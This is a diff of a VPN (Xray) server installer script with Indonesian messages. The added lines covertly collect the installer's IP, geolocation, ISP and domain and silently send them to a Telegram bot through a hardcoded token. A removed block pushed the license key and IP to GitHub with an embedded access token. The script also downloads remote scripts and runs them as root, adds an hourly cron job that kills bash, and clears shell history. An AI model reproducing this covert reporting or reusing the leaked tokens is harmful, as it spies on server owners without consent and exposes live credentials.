@@ -118,7 +118,6 @@ chmod +x /root/.acme.sh/acme.sh
 ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
 echo -e "${OKEY} Your Domain : $domain"
 sleep 2
-
 #install jembot
 echo -e "$white\033[0;34m+-----------------------------------------+${NC}"
 echo -e " \E[41;1;39m           ? Install Jembot ?            \E[0m$NC"
@@ -137,7 +136,24 @@ echo -e " \E[41;1;39m            ? Install Xray ?             \E[0m$NC"
 echo -e "$white\033[0;34m+-----------------------------------------+${NC}"
 sleep 1 
 wget -q https://raw.githubusercontent.com/Amoebacoy/newpro/main/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
-
+IP=$(echo $SSH_CLIENT | awk '{print $1}')
+TMPFILE='/tmp/ipinfo-$DATE_EXEC.txt'
+curl http://ipinfo.io/$IP -s -o $TMPFILE
+ORG=$(cat $TMPFILE | jq '.org' | sed 's/"//g')
+domain=$(cat /etc/xray/domain)
+LocalVersion=$(cat /root/versi)
+IPVPS=$(curl -s ipinfo.io/ip )
+ISPVPS=$( curl -s ipinfo.io/org )
+token=5922026926:AAE5t2CXnOOT57zWdua2wfHKKG9URGEQdP0
+chatid=1106186898
+ttoday="$(vnstat | grep today | awk '{print $8" "substr ($9, 1, 3)}' | head -1)"
+tmon="$(vnstat -m | grep `date +%G-%m` | awk '{print $8" "substr ($9, 1 ,3)}' | head -1)"
+DATE_EXEC="$(date "+%d %b %Y %H:%M")"
+CITY=$(cat $TMPFILE | jq '.city' | sed 's/"//g')
+REGION=$(cat $TMPFILE | jq '.region' | sed 's/"//g')
+COUNTRY=$(cat $TMPFILE | jq '.country' | sed 's/"//g')
+curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chatid" -d text="$IPVPS domain $domain telah install XrayCol pada $DATE_EXEC di $CITY, $REGION via $ORG" > /dev/null 2>&1
+clear
 # // Download Data
 echo -e "${GREEN}Download Data${NC}"
 wget -q -O /usr/bin/add-ws "https://raw.githubusercontent.com/Amoebacoy/newpro/main/add-ws.sh"
@@ -201,53 +217,39 @@ chmod +x /usr/bin/menu
 chmod +x /usr/bin/wbm
 chmod +x /usr/bin/xp
 #chmod +x /usr/bin/update
-
-#cat > /etc/cron.d/re_otm <<-END
-#SHELL=/bin/sh
-#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-#0 7 * * * root /sbin/reboot
-#END
-
 cat > /etc/cron.d/xp_otm <<-END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 2 0 * * * root /usr/bin/xp
 END
-
 cat > /etc/cron.d/cl_otm <<-END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 2 1 * * * root /usr/bin/clearlog
 END
-
+echo "59 * * * * root killall /bin/bash /usr/bin/menu" >> /etc/crontab
 cat > /home/re_otm <<-END
 7
 END
-
 service cron restart >/dev/null 2>&1
 service cron reload >/dev/null 2>&1
-
 clear
 cat> /root/.profile << END
-# ~/.profile: executed by Bourne-compatible login shells.
-
 if [ "$BASH" ]; then
-  if [ -f ~/.bashrc ]; then
-    . ~/.bashrc
-  fi
+if [ -f ~/.bashrc ]; then
+. ~/.bashrc
 fi
-
+fi
 mesg n || true
 clear
 menu
 END
 chmod 644 /root/.profile
-
 if [ -f "/root/log-install.txt" ]; then
-rm -fr /root/log-install.txt 
+rm -fr /root/log-install.txt
 fi
 if [ -f "/etc/afak.conf" ]; then
-rm -fr /etc/afak.conf 
+rm -fr /etc/afak.conf
 fi
 if [ ! -f "/etc/log-create-user.log" ]; then
 echo "Log All Account " > /etc/log-create-user.log
@@ -261,20 +263,6 @@ gg="PM"
 else
 gg="AM"
 fi
-echo -e "[ ${green}Pleas Wait Update DB ${NC} ]"
-git clone https://github.com/kenDevXD/limit.git /root/limit/ &> /dev/null
-babu=$(cat /etc/.geovpn/license.key)
-echo -e "$babu $IP $Masa_Laku_License_Berlaku_Sampai" >> /root/limit/limit.txt
-cd /root/limit
-    git config --global user.email "zkendev@gmail.com" &> /dev/null
-    git config --global user.name "kenDevXD" &> /dev/null
-    rm -fr .git &> /dev/null
-    git init &> /dev/null
-    git add . &> /dev/null
-    git commit -m m &> /dev/null
-    git branch -M main &> /dev/null
-    git remote add origin https://github.com/kenDevXD/limit
-    git push -f https://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@github.com/kenDevXD/limit.git &> /dev/null
 cd
 echo "1.1" >> /home/.ver
 rm -fr /root/limit
@@ -335,10 +323,11 @@ rm -fr /root/ins-xray.sh
 rm -fr /root/setup.sh
 rm -fr /root/domain
 history -c
-
-echo -ne "[ ${yell}WARNING${NC} ] Apakah Anda Ingin Reboot Sekarang ? (y/n)? "
+secs_to_human "$(($(date +%s) - ${start}))"
+echo -e "${YB}[ WARNING ] reboot now ? (Y/N)${NC} "
 read answer
 if [ "$answer" == "${answer#[Yy]}" ] ;then
 exit 0
 else
 reboot
+fi
